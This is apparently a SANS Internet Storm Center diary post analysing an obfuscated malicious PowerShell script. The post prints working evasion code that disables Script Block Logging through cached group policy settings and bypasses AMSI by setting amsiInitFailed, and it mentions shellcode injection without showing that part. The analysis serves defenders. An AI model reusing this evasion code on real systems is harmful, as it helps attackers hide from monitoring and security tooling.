---
title: Obfuscated Deactivation of Script Block Logging, (Fri, Feb 10th)
url: https://isc.sans.edu/diary/rss/29538
source: SANS Internet Storm Center, InfoCON: green
date: 2023-02-11
fetch_date: 2025-10-04T06:21:30.514106
---

# Obfuscated Deactivation of Script Block Logging, (Fri, Feb 10th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29534)
* [next](/diary/29542)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Obfuscated Deactivation of Script Block Logging](/forums/diary/Obfuscated%2BDeactivation%2Bof%2BScript%2BBlock%2BLogging/29538/)

**Published**: 2023-02-10. **Last Updated**: 2023-02-10 10:09:07 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Obfuscated%2BDeactivation%2Bof%2BScript%2BBlock%2BLogging/29538/#comments)

PowerShell has a great built-in feature called "Script Block Logging"[[1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)]. It helps to record all activities performed by a script and is a goldmine for incident handlers. That's the reason why attackers tend to try to disable this feature. There are many ways to achieve this, but I found an interesting one.

The obfuscation technique uses a "Collections.Generic.Dictionary" object. This type of collection represents a collection of keys and values. Here is the interesting code (I kept only the code relevant to the collection:

```

$wi=(('EnableSc{2}ip{1'+'}{3'+'}'+'lo'+'c'+'{0}Logging')-f'k','t','r','B');
$db9=[Collections.Generic.Dictionary[string,System.Object]]::new();
$iN=(('{0}crip{2}'+'B{'+'1}ockL'+'ogg'+'ing')-f'S','l','t');
If($PSVersionTable.PSVersion.Major -ge 3)
{
    $zz=[Ref].Assembly.GetType((('S{5}stem.'+'{'+'3}anagem'+'ent'+'.{0'+'}{4}tomation.{2}ti{'+'1}'+'s')-f'A','l','U','M','u','y'));
    $zqu=[Ref].Assembly.GetType((('{5}{6}'+'st{9'+'}m.{2'+'}'+'a'+'na{3'+'}{'+'9}'+'m{9'+'}'+'nt.{'+'8}{0}t'+'{'+'7'+'}'+'ma'+'ti{'+'7}n'+'.{'+'8'+'}msi{1}ti{4}s')-f'u','U','M','g','l','S','y','o','A','e'));
    $rH=(('E'+'na{0}l'+'eSc{3}ipt{1'+'}loc'+'{4}{2}nvoc'+'ation{5}oggi'+'n'+'g')-f'b','B','I','r','k','L');
    $xTv=$zz.GetField('cachedGroupPolicySettings','NonPublic,Static');
    if ($zqu)
    {
        $zqu.GetField((('a{3'+'}{4}i'+'I{0'+'}'+'i'+'tF'+'ail{2'+'}{1'+'}') f'n','d','e','m','s'),'NonPublic,Static').SetValue($null,$true);
    };
    If ($xTv)
    {
        $iG5H=$xTv.GetValue($null);
        $db9.Add($wi,0);
        $db9.Add($rH,0);
        $iG5H['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$iN]=$db9;
```

The collection of values is created in the $db9 variable. Later two keys are added, and the collection is used to modify the registry to disable the logging feature.

```

[DBG]: PS C:\Users\REM>> $db9

Key                                Value
---                                -----
EnableScriptBlockLogging               0
EnableScriptBlockInvocationLogging     0
```

The remaining part of the script is classic and injects a shellcode in the Powershell process.

[1] <https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Logging](/tag.html?tag=Logging) [Obfuscation](/tag.html?tag=Obfuscation) [PowerShell](/tag.html?tag=PowerShell)

[0 comment(s)](/diary/Obfuscated%2BDeactivation%2Bof%2BScript%2BBlock%2BLogging/29538/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/29534)
* [next](/diary/29542)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)